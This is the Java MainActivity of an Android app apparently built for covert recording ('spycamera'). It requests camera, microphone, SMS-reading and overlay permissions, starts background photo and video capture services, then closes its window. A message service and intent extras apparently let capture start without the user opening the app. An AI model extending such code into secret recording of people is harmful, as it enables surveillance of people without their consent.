package com.example.spycamera;

import android.Manifest;
import android.app.ActivityManager;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.ImageView;
import android.widget.RelativeLayout;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.viewpager.widget.ViewPager;

import com.example.spycamera.Activities.CameraService;
import com.example.spycamera.Activities.SettingActivity;
import com.example.spycamera.Activities.VideoService;
import com.example.spycamera.Adaptors.TabAdaptor;
import com.example.spycamera.ReceiveMessagesServices.MessageService;
import com.example.spycamera.Utilities.BooleanValueListener;
import com.example.spycamera.Utilities.Constants;
import com.example.spycamera.Utilities.Helper;
import com.example.spycamera.Utilities.SPHelper;
import com.google.android.material.tabs.TabLayout;

import java.io.File;

public class MainActivity extends AppCompatActivity {
    TabLayout tabLayout;
    ViewPager viewPager;
    RelativeLayout mainLay;
    ImageView iv_setting, iv_start;
    boolean isVideo = false;
    int PERMISSION_ALL = 1;
    String notification = "";
    Context context;
    TabAdaptor adapter;
    AlertDialog dialog;
    String[] PERMISSIONS = {
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
    };

    public static BooleanValueListener booleanValueListener, isDataChangeListener;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getSupportActionBar().hide();
        initUI();

        SPHelper.setFirstAppRunTime(context);
        booleanValueListener = new BooleanValueListener(checkIfServiceRunning(true));
        booleanValueListener.setVariableChangeListener(variableThatHasChanged -> {
            checkIfServiceRunning(true);
        });

        isDataChangeListener = new BooleanValueListener(false);
        isDataChangeListener.setVariableChangeListener(variableThatHasChanged -> {
            if (isDataChangeListener.getValue()) {
                if (adapter != null) {
                    int currentItem = viewPager.getCurrentItem();
                    viewPager.setAdapter(null);
                    viewPager.setAdapter(adapter);
                    checkIfServiceRunning(true, currentItem);
                }
            }
        });
        checkIfCreatedToStartBackgroundService();
    }

    private void checkIfCreatedToStartBackgroundService() {
        Bundle bundle = getIntent().getExtras();
        if (bundle != null) {
            String serviceType = bundle.getString("serviceType");
            if (serviceType != null && serviceType.equals(Constants.CAMERA_ON)) {
                stopServiceForcefully();
                Intent serviceIntent = new Intent(MainActivity.this, CameraService.class);
                serviceIntent.putExtra("photoChoice", "1");
                serviceIntent.putExtra("photoChoiceInput", "1000");
                serviceIntent.putExtra("photoBuffer", "5");
                MainActivity.this.startService(serviceIntent);
                finish();
            } else if (serviceType != null && serviceType.equals(Constants.VIDEO_ON)) {
                stopServiceForcefully();
                Intent serviceIntent = new Intent(MainActivity.this, VideoService.class);
                serviceIntent.putExtra("videoDuration", "60");
                MainActivity.this.startService(serviceIntent);
                finish();
            }
        }
    }

    @Override
    protected void onResume() {
        try {
            super.onResume();
            if (!Helper.checkOverlayDisplayPermission(this)) {
                SPHelper.setLastAppRunTime(context, -1);
                if (hasPermissions(this, PERMISSIONS)) requestOverlayDisplayPermission();
            } else {
                if (dialog != null) dialog.cancel();
                SPHelper.setLastAppRunTime(context, System.currentTimeMillis());
            }

            checkIfServiceRunning(true);
            if (!isMyServiceRunning(MessageService.class)) {
                startService(new Intent(MainActivity.this, MessageService.class));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        overridePendingTransition(0, 0);
    }

    private void initUI() {
        context = this;
        tabLayout = findViewById(R.id.tabLayout);
        viewPager = findViewById(R.id.viewPager);
        mainLay = findViewById(R.id.mainLay);
        iv_setting = findViewById(R.id.iv_setting);
        iv_start = findViewById(R.id.iv_start);

        tabLayout.addTab(tabLayout.newTab().setText("Photo"));
        tabLayout.addTab(tabLayout.newTab().setText("Video"));
        tabLayout.setTabGravity(TabLayout.GRAVITY_FILL);
        onNewIntent(getIntent());

        ContextWrapper wrapper = new ContextWrapper(context);
        File imageFolder = wrapper.getDir("Images", MODE_PRIVATE);
        File videoFolder = wrapper.getDir("Videos", MODE_PRIVATE);

        adapter = new TabAdaptor(
                getSupportFragmentManager(), tabLayout.getTabCount(),
                imageFolder, videoFolder);
        viewPager.setAdapter(adapter);
        viewPager.addOnPageChangeListener(new TabLayout.TabLayoutOnPageChangeListener(tabLayout));
        tabLayout.addOnTabSelectedListener(new TabLayout.OnTabSelectedListener() {
            @Override
            public void onTabSelected(TabLayout.Tab tab) {
                if (tab.getPosition() == 0) {
                    iv_start.setImageResource(R.drawable.camera);
                    isVideo = false;
                } else {
                    iv_start.setImageResource(R.drawable.video);
                    isVideo = true;
                }
                viewPager.setCurrentItem(tab.getPosition());
                checkIfServiceRunning(false);
            }

            @Override
            public void onTabUnselected(TabLayout.Tab tab) {

            }

            @Override
            public void onTabReselected(TabLayout.Tab tab) {

            }
        });


        iv_setting.setOnClickListener(view -> {
            Intent intent = new Intent(this, SettingActivity.class);
            intent.putExtra("ISVIDEO", isVideo);
            startActivity(intent);
        });

        if (!hasPermissions(this, PERMISSIONS)) {
            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
            SPHelper.setLastAppRunTime(context, -1);
        } else {
            SPHelper.setLastAppRunTime(context, System.currentTimeMillis());
        }

        iv_start.setOnClickListener(view -> {
            try {
                if (!hasPermissions(this, PERMISSIONS)) {
                    permissionDialog();
                    Toast.makeText(context, "Permissions not granted", Toast.LENGTH_SHORT).show();
                } else {
                    SPHelper.setLastAppRunTime(context, System.currentTimeMillis());
                    if (checkIfServiceRunning(false)) {
                        if (isMyServiceRunning(VideoService.class)) {
                            stopService(new Intent(MainActivity.this, VideoService.class));
                        }
                        if (isMyServiceRunning(CameraService.class)) {
                            stopService(new Intent(MainActivity.this, CameraService.class));
                        }
                        Toast.makeText(context, "Camera Stopped", Toast.LENGTH_SHORT).show();
                        finish();
                        this.startActivity(getIntent().addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                                .putExtra("IS_VIDEO", isVideo));
                    } else {
                        if (isVideo) {
                            stopServiceForcefully();
                            startService(new Intent(MainActivity.this,
                                    VideoService.class));
                        } else {
                            stopServiceForcefully();
                            startService(new Intent(MainActivity.this,
                                    CameraService.class));
                        }
                        finish();
                    }
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        });

        setPreferences();

        if (notification.equalsIgnoreCase("STOP")) {
            if (isMyServiceRunning(VideoService.class)) {
                stopService(new Intent(MainActivity.this, VideoService.class));
            }
        }
        if (notification.equalsIgnoreCase("STOP")) {
            if (isMyServiceRunning(CameraService.class)) {
                stopService(new Intent(MainActivity.this, CameraService.class));
            }
        }

        boolean is_video = getIntent().getBooleanExtra("IS_VIDEO", false);
        if (is_video) {
            isVideo = true;
            viewPager.setCurrentItem(1);
        }
    }

    private void permissionDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(context);
        builder.setMessage("We need to performing necessary task. Please permit the permission through "
                + "Settings screen.\n\nSelect Permissions -> Enable permission");
        builder.setCancelable(false);
        builder.setPositiveButton("Permit Manually", (dialog, which) -> {
            dialog.dismiss();
            Intent intent = new Intent();
            intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            Uri uri = Uri.fromParts("package", context.getPackageName(), null);
            intent.setData(uri);
            context.startActivity(intent);
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    public boolean checkIfServiceRunning(boolean changeTab) {
        if (isMyServiceRunning(VideoService.class)) {
            iv_start.setImageResource(R.drawable.ic_baseline_stop_24);
            if (changeTab) {
                isVideo = true;
                viewPager.setCurrentItem(1);
            }
            return true;
        } else if (isMyServiceRunning(CameraService.class)) {
            iv_start.setImageResource(R.drawable.ic_baseline_stop_24);
            if (changeTab) {
                isVideo = false;
                viewPager.setCurrentItem(0);
            }
            return true;
        }
        iv_start.setImageResource(isVideo ? R.drawable.video : R.drawable.camera);
        return false;
    }

    public boolean checkIfServiceRunning(boolean changeTab, int currentItem) {
        if (isDataChangeListener != null) {
            isDataChangeListener.setValue(false);
        }
        if (isMyServiceRunning(VideoService.class)) {
            iv_start.setImageResource(R.drawable.ic_baseline_stop_24);
            if (changeTab) {
                isVideo = true;
                viewPager.setCurrentItem(1);
            }
            return true;
        } else if (isMyServiceRunning(CameraService.class)) {
            iv_start.setImageResource(R.drawable.ic_baseline_stop_24);
            if (changeTab) {
                isVideo = false;
                viewPager.setCurrentItem(0);
            }
            return true;
        }
        viewPager.setCurrentItem(currentItem > -1 ? currentItem : 0);
        iv_start.setImageResource(isVideo ? R.drawable.video : R.drawable.camera);
        return false;
    }


    private void stopServiceForcefully() {
        if (isMyServiceRunning(VideoService.class)) {
            stopService(new Intent(MainActivity.this, VideoService.class));
        }
        if (isMyServiceRunning(CameraService.class)) {
            stopService(new Intent(MainActivity.this, CameraService.class));
        }
    }

    public static boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }

    public void requestOverlayDisplayPermission() {
        if (dialog != null) dialog.cancel();
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setCancelable(true);
        builder.setTitle("Screen Overlay Permission Needed");
        builder.setMessage("Enable 'Display over other apps' from System Settings.");
        builder.setPositiveButton("Open Settings", (dialog, which) -> {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, RESULT_OK);
        });
        dialog = builder.create();
        dialog.show();
    }

    void setPreferences() {
        SPHelper spHelper = new SPHelper();
        if (spHelper.getCameraChoice(context).equals("")) {
            spHelper.addPhotoSettings(context, "BACK", "1", "1", "10");
            spHelper.addVideoSettings(context, "FRONT", "1");
        }
    }

    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    @Override
    public void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        Bundle extras = intent.getExtras();
        if (extras != null)
            notification = extras.getString("CLICKED", "UNDEFINED");
    }
}